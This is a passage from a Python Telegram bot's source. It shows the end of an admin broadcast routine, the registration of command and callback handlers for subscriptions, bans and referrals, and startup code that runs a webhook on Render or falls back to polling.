                await context.bot.send_message(u[0], text, parse_mode="Markdown")
                success += 1
                await asyncio.sleep(0.05)
            except:
                failed += 1
        await status_msg.edit_text(f"📢 *Broadcast Completed!*\n\n✅ Sent: {success}\n❌ Failed: {failed}", parse_mode="Markdown")

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin_command))
    app.add_handler(CommandHandler("give_sub", give_sub_command))
    app.add_handler(CommandHandler("ban", ban_command))
    app.add_handler(CommandHandler("unban", unban_command))
    app.add_handler(CallbackQueryHandler(admin_callback_handler, pattern="^(adm_|app_ref_)"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    PORT = int(os.environ.get("PORT", 8443))
    RENDER_EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL")
    
    if RENDER_EXTERNAL_URL:
        print(f"Starting webhook on {RENDER_EXTERNAL_URL}")
        app.run_webhook(
            listen="0.0.0.0",
            port=PORT,
            url_path=BOT_TOKEN,
            webhook_url=f"{RENDER_EXTERNAL_URL}/{BOT_TOKEN}"
        )
    else:
        print("Starting polling...")
        app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
